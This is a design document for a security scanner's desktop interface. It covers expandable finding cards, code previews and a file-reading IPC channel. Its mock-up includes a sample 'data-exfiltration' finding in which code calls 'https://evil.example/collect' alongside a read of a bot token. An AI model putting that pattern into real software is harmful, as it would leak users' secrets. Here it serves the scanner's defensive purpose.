# Finding Card Code Preview Design

**Date:** 2026-06-15  
**Status:** Approved  
**Approach:** Inline card expand with codeSnippet + on-demand file context via IPC

---

## Goal

Allow users to click a finding card to expand it and see the corresponding code, recommended fix, and patch draft. An additional "Show Context" button loads surrounding lines from the source file for deeper inspection.

---

## Approach

Cards expand inline (same pattern as the rules editor). Code snippet is displayed from the existing `finding.codeSnippet` field. When the user wants more context, a `source:read` IPC call reads the original file and returns surrounding lines with line numbers.

| Alternative | Why Not |
|---|---|
| Pre-load all context at scan time | Scan result payload would be huge |
| Monaco/highlight.js syntax highlighting | Heavy dependency; index.html already 1200+ lines |

---

## Interaction Flow

1. User clicks finding card → card expands, showing:
   - `codeSnippet` in a `<pre><code>` block with line numbers (`lineStart`–`lineEnd`)
   - `recommendedFix` text
   - `remediation.patchDraft` (if present) in a code block
2. Expanded area has a "Show Context" button at the bottom
3. User clicks "Show Context" → calls `source:read` IPC with `{ filePath, lineStart, lineEnd, contextLines: 5 }`
4. Main process reads the file, returns surrounding lines (5 before, 5 after)
5. Context block replaces the "Show Context" button, showing full source with line numbers; highlighted lines have a distinct background
6. Clicking the card title row again collapses the expanded area
7. Only one card expanded at a time — others auto-collapse

---

## IPC Changes

### New channel: `source:read`

**Main process handler:**

```ts
ipcMain.handle("source:read", async (_event, payload: {
  basePath: string;
  filePath: string;
  lineStart: number;
  lineEnd: number;
  contextLines: number;
}) => {
  // Resolve: path.join(payload.basePath, payload.filePath)
  // Read file, split into lines
  // Return { lines: string[], highlightedStart: number, highlightedEnd: number }
  // If file not found: return { error: "File not found" }
});
```

- `basePath` = `report.target.localPath` (the scanned directory's absolute path)
- `filePath` = finding's relative path (e.g. `src/index.ts`)
- `contextLines` = 5 by default (5 lines before and after)

**Preload bridge addition:**

```js
sourceRead: (payload) => invoke("source:read", payload)
```

**IPC allowlist addition:** `"source:read"`

---

## UI Structure

### Finding card expanded HTML structure

```html
<div class="panel finding expanded" data-risk="Critical">
  <!-- Title row (click to collapse) -->
  <div class="finding-header">
    <strong>Critical</strong> data-exfiltration
    <button class="collapse-btn">▼</button>
    <br />
    <span class="muted">src/index.ts:5-14</span>
  </div>

  <!-- Expanded detail area -->
  <div class="finding-detail">
    <h4>Code Snippet</h4>
    <pre class="finding-code"><code>5 │ https.request('https://evil.example/collect'...)
6 │ const token = process.env.TELEGRAM_BOT_TOKEN;</code></pre>

    <h4>Recommended Fix</h4>
    <p class="finding-fix">Remove the outbound request or require explicit user consent.</p>

    <!-- Patch Draft (only if remediation.patchDraft exists) -->
    <h4>Patch Draft</h4>
    <pre class="finding-patch"><code>- https.request('https://evil.example/collect')
+ // REMOVED: outbound request</code></pre>

    <!-- Show Context button (replaced after click) -->
    <button class="secondary show-context">Show Context</button>
  </div>
</div>
```

### CSS classes

| Class | Purpose |
|-------|---------|
| `.finding.expanded` | Card in expanded state |
| `.finding-detail` | Expanded area container (padding, border-top) |
| `.finding-header` | Title row, cursor pointer |
| `.finding-code` | `<pre>` block, background `#f8f9fa`, monospace font |
| `.finding-fix` | Recommended fix text |
| `.finding-patch` | Patch draft code block |
| `.finding-context` | Context code block after "Show Context" click |
| `.line-num` | Line number column, fixed width, color `#6c757d` |
| `.line-highlight` | Highlighted line background `#fff3cd` |

---

## i18n Keys

4 new keys across EN/zh-TW/zh-CN:

| Key | EN | zh-TW | zh-CN |
|-----|----|-------|-------|
| `finding.codeSnippet` | Code Snippet | 程式碼片段 | 代码片段 |
| `finding.recommendedFix` | Recommended Fix | 建議修復 | 建议修复 |
| `finding.patchDraft` | Patch Draft | 修補草稿 | 修补草稿 |
| `finding.showContext` | Show Context | 顯示上下文 | 显示上下文 |

Note: `report.codeSnippet` already exists in i18n but is for the full report; finding cards use shorter, card-specific keys.

---

## Error Handling

- **File not found** (remote repo cleaned up, or path invalid): Show inline message "Source file not available" in the context area, replacing the "Show Context" button
- **Read error** (permission denied, encoding issue): Show "Unable to read source file" message
- **Large file**: Only return the requested line range + context; never send entire file content

---

## Code Changes Summary

| File | Action | Description |
|------|--------|-------------|
| `apps/electron/src/main.ts` | Modify | Add `source:read` IPC handler |
| `apps/electron/src/preload.cjs` | Modify | Add `sourceRead` bridge method |
| `apps/electron/src/ipc.ts` | Modify | Add `"source:read"` to allowed channels |
| `apps/electron/src/renderer/index.html` | Modify | Finding card expand/collapse, code preview, "Show Context" button, CSS |
| `apps/electron/tests/ipc.test.ts` | Modify | Assert `"source:read"` in allowed channels |
| `packages/scanner-core/src/i18n.ts` | Modify | Add 4 finding i18n keys |

---

## Scope Exclusions

- No syntax highlighting library (pure `<pre><code>`)
- No file editing capability
- No diff view (patchDraft shown as plain text)
- No multi-file context (one file per finding)
- No bookmarking or pinning expanded cards
